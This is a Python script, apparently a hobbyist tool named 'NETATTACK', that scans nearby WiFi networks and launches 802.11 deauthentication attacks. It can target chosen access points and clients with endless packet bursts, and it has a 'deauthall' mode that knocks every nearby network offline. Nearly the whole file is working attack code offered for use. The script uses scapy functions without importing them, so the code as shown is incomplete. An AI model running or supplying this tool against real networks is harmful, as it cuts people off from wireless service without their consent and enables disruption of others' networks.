#!/usr/bin/env python

import sys
import os
import time
import argparse
from threading import Thread
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
P  = '\033[35m' # purple
BOLD = '\033[1m' # bold
THIN = '\033[1m' # normal

# creating arguments
def argument_parser():
    parser = argparse.ArgumentParser(usage='''

'''+BOLD+'''SCAN NETWORKS:'''+THIN+O+'''
    -scan       (Main command)'''+W+'''
    -i or -mon  (Interfaces)
    -cf         (More detailed output format)
    -t          (Set channel switch delay)
    -nr         (Don't do a rescan)

'''+BOLD+'''DEAUTH CERTAIN NETWORKS:'''+THIN+O+'''
    -deauth     (Main command)'''+W+'''
    -b          (Add a BSSID)
    -u          (Add a client)
    -i or -mon  (Interfaces)
    -p          (Change Packetburst)
    -t          (set time Interval)

'''+BOLD+'''DEAUTH ALL NETWORKS:'''+THIN+O+'''
    -deauthall  (Main command)'''+W+'''
    -i or -mon  (Interfaces)
    -p          (Packetburst)''')

    parser.add_argument('-mon',
                        '--monitor',
                        action='store_true',
                        help='This activates the monitoring mode \
                              and automatically searches for your wlan device.')
    parser.add_argument('-scan',
                        '--scan',
                        action='store_true',
                        help='This is one of the main parameters. \
                              It searches for all available WiFi-Networks. \
                              Other parameters can be added optionally.')
    parser.add_argument('-cf',
                        '--channelformat',
                        action='store_true',
                        help='It activates the channelformat. \
                              It\'s kind of verbose layout of searching. \
                              Espacially useful if searching for 1 network.')
    parser.add_argument('-t',
                        '--timeout',
                        type=float,
                        help='This is setting a delay. \
                              It can be used to add a delay to deauth \
                              or a delay for switching the channel while scanning. \
                              DEFAULT = 0.75')
    parser.add_argument('-nr',
                        '--norescan',
                        action='store_true',
                        help='-nr can only be used with -scan. \
                              This deactivates multiple scans \
                              and stops when channel 14 is reached.')
    parser.add_argument('-deauth',
                        '--deauth',
                        action='store_true',
                        help='This is one of the main parameters. \
                              It deauth-attacks a certain BSSID. \
                              Adding a client is optionally.')
    parser.add_argument('-deauthall',
                        '--deauthall',
                        action='store_true',
                        help='This is one of the main parameters. \
                              It searches all the WiFi Networks near by \
                              and deauth-attacks them.')
    parser.add_argument('-b',
                        '--bssid',
                        nargs='*',
                        help='With this you add a BSSID to a deauth. \
                              It\'s a necessary parameter for -deauth.')
    parser.add_argument('-a',
                        '--amount',
                        default=0,
                        type=int,
                        help='This is the amount of deauth-packages to be send. \
                              It can only be used with -deauth \
                              DEFAULT = infinite')
    parser.add_argument('-u',
                        '--client',
                        default='FF:FF:FF:FF:FF:FF',
                        help='This adds a client to a deauth-attack. \
                              It can only be used with -deauth and is optionally.\
                              DEFAULT = FF:FF:FF:FF:FF:FF (Broadcast)')
    parser.add_argument('-c',
                        '--channel',
                        type=int,
                        help='This adds a channel to a deauth-attack. \
                              It can only be used with -d. \
                              If there is no certain channel the current channel will be used.')
    parser.add_argument('-p',
                        '--packetburst',
                        type=int,
                        default=64,
                        help='This sets the amount of packets in one burst. \
                              It can only be used with -d \
                              DEFAULT = 64')
    parser.add_argument('-i',
                        '--interface',
                        help='This is a necessary parameter. \
                              It calls the monitoring interface. \
                              This parameter needs to be included everywhere.')

    return parser

def throw_error():
    # invalid arguments handling
    if not args.deauth and not args.scan and not args.deauthall and not args.monitor:
        argument_parser().print_usage()
        sys.exit(0)
    if not args.interface and not args.monitor:
        print('[' +R+ '-' +W+'] No interface selected.')
        sys.exit(0)
    if args.deauth and args.channelformat:
        print('[' +R+ '-' +W+'] Parameter -cf not available when deauthing.')
        sys.exit(0)
    if args.deauth and not args.bssid:
        print('[' +R+ '-' +W+'] Error. No BSSID selected.')
        sys.exit(0)
    if args.scan and args.packetburst != 64:
        print('[' +R+ '-' +W+'] Parameter -p not available when scanning.')
    if args.scan and args.amount:
        print('[' +R+ '-' +W+'] Parameter -a not available when scanning.')
        sys.exit(0)
    if args.scan and args.bssid:
        print('[' +R+ '-' +W+'] Parameter -b not available when scanning.')
        sys.exit(0)
    if args.scan and args.deauth:
        print('[' +R+ '-' +W+'] Scan and Deauth can\'t be executed at the same time.')
        sys.exit(0)
    if args.deauth and args.norescan:
        print('[' +R+ '-' +W+'] Parameter -nr not available when deauthing.')
    if args.deauthall:
        if args.bssid or args.channel or args.amount or args.deauth or args.norescan or args.timeout or args.channelformat or args.scan:
            print('[' +R+ '-' +W+'] (1) -deauthall -i ["iface"] -p ["packets"]| no more parameters. (2) Remove -deauthall')
    if args.bssid and args.client != 'FF:FF:FF:FF:FF:FF':
        if len(args.bssid) > 1:
            print('[' +R+ '-' +W+'] Unable to add clients if there are multiple BSSIDs.')
            sys.exit(0)
    if args.interface and args.monitor:
        print('[' +R+ '-' +W+'] You can\'t use -i and -mon. Try only one of them.')
        sys.exit(0)


# # # # # # # # # # # # # # #
#           SCAN            #
# # # # # # # # # # # # # # #

# handling the packages
def pckt_handler(pckt):
    if pckt.haslayer(Dot11): #-> check if pckt type 802.11
        if pckt.type == 0 and pckt.subtype == 8: # check if Beacon frame
            if pckt.addr2 not in APs:
                APs[pckt.addr2] = on_channel #-> add to APs dict
                output_aps(pckt.addr2, pckt.info, on_channel) #-> print it out

# printing found ap
def output_aps(bssid, essid, channel):
    ch_space = 2 # leave different space for channel numbers
    if len(str(channel)) == 1:
        ch_space = 3

    if args.channelformat:
        print('[' +G+ '+' +W+ '] [' +P+ 'BSSID' +W+ '] '+str(bssid).upper()+' '*2+'|'+' '*2+'[' +P+ 'CH' +W+ '] '+str(channel)+' '*ch_space+'|'+' '*2+'[' +P+ 'ESSID' +W+ '] '+essid+'')

    else:
        print(str(bssid).upper() + '  |  ' + str(channel) + ' '*ch_space + '|  ' + str(essid))


# hopping between wifi channels
def channel_hop():
    global on_channel

    timeout = 0.75

    if args.timeout:
        timeout = args.timeout

    if not args.channelformat:
        print('\n[' +O+ '*' +W+ '] Searching for WiFi Networks...\n')
        print(O+ 'MAC' + ' '*19 + 'CH' + ' '*5 + 'ESSID' +W)

    while True:
        if on_channel > 14:
            if args.norescan:
                print('\nPress CTRL-C to quit...')
                sys.exit(0)
            elif not rescan:
                break
            else:
                on_channel = 1
                if args.channelformat:
                    print('\n--------------- RESCAN ---------------\n')
                continue

        if args.channelformat:
            print('[CHANNEL] ' + str(on_channel) + '/14')

        os.system('iwconfig ' + iface + ' channel ' + str(on_channel))

        time.sleep(timeout)
        on_channel += 1


# # # # # # # # # # # # # # #
#           DEAUTH          #
# # # # # # # # # # # # # # #

def set_channel():
    channel = 4
    if args.channel:
        channel = args.channel
    os.system('iwconfig ' + iface + ' channel ' + str(channel))

# creating and managing packets
def deauth(args):
    bssid = args.bssid
    client = args.client
    amount = args.amount
    sleep = 0
    endless = False
    if amount == 0:
        endless = True
    if args.timeout:
        sleep = args.timeout

    while endless:
        for ap in bssid:
            ap_c_pckt = Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
            if client != 'FF:FF:FF:FF:FF:FF':
                c_ap_pckt = Dot11(addr1=ap, addr2=client, addr3=ap) / Dot11Deauth()
            try:
                for x in range(args.packetburst):
                    send(ap_c_pckt)
                    if client != 'FF:FF:FF:FF:FF:FF':
                        send(c_ap_pckt)
                print('[' +G+ '+' +W+ '] Sent Deauth-Packets to ' + ap)
                time.sleep(sleep)
            except(KeyboardInterrupt):
                print('\n[' +R+ '!' +W+ '] ENDING SCRIPT...')
                sys.exit(0)

    while amount > 0 and not endless:
        for ap in bssid:
            ap_c_pckt = Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
            if client != 'FF:FF:FF:FF:FF:FF':
                c_ap_pckt = Dot11(addr1=ap, addr2=client, addr3=ap) / Dot11Deauth()
            try:
                for x in range(args.packetburst):
                    send(ap_c_pckt)
                    if client != 'FF:FF:FF:FF:FF:FF':
                        send(c_ap_pckt)
                print('[' +G+ '+' +W+ '] Sent Deauth-Packets to ' + ap)

                amount -= 1
                time.sleep(sleep)

            except (KeyboardInterrupt):
                print('\n[' +R+ '!' +W+ '] ENDING SCRIPT...')
                sys.exit(0)

    print('[' +R+ '!' +W+ '] Finished successfully.')


def deauth_all():
    print('\n[' +O+ '*' +W+ '] Starting deauth...\n')
    while True:
        for ap in APs:
            for x in range(args.packetburst):
                try:
                    ap_c_pckt = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap) / Dot11Deauth()
                    os.system('iwconfig ' + iface + ' channel ' + str(APs[ap]))
                    send(ap_c_pckt)
                except (KeyboardInterrupt):
                    print('\n[' +R+ '!' +W+ '] ENDING SCRIPT...')
                    sys.exit(0)
            print('[' +G+ '+' +W+ '] Sent Deauth-Packets to ' + str(ap).upper())


# # # # # # # # # # # # # # #
#           MONITOR         #
# # # # # # # # # # # # # # #

def monitor_on():
    ifaces = os.listdir('/sys/class/net/')
    status = False
    for iface in ifaces:
        if 'wlan' in iface:
            print('\n[' +G+ '+' +W+ '] Interface found!\nTurning on monitoring mode...')
            os.system('ifconfig ' + iface + ' down')
            os.system('iwconfig ' + iface + ' mode monitor')
            os.system('ifconfig ' + iface + ' up')
            print('[' +G+ '+' +W+ '] Turned on monitoring mode on: ' + iface)
            status = True
            return iface
    if status == False:
        print('[' +R+ '-' +W+'] No interface found. Try it manually.')
        sys.exit(0)


# # # # # # # # # # # # # # #
#           MAIN            #
# # # # # # # # # # # # # # #

if __name__ == '__main__':
    print(P+'* * * * * * * * * * * * * * * * * *')
    print('* N E T A T T A C K  by chrizator *')
    print('* * * * * * * * * * * * * * * * * *'+W)
    
    args = argument_parser().parse_args()
    APs = {}
    on_channel = 1
    rescan = True

    throw_error()

    iface = None
    if args.interface:
        iface = args.interface
    if args.monitor:
        iface = monitor_on()
    
    conf.iface = iface #-> set scapy's interface

    ## SCAN ##
    if args.scan:
        # channel hopping thread
        hop_t = Thread(target=channel_hop, args=[])
        hop_t.daemon = True
        hop_t.start()


        sniff(iface=iface, prn=pckt_handler, store=0)


    ## DEAUTH ##
    if args.deauth:
        set_channel()
        deauth(args)
        

    ## DEAUTHALL#
    if args.deauthall:
        rescan = False

        hop_t = Thread(target=channel_hop, args=[])
        hop_t.daemon = True
        hop_t.start()

        sniff(iface=iface, prn=pckt_handler, store=0, timeout=13)
        deauth_all()
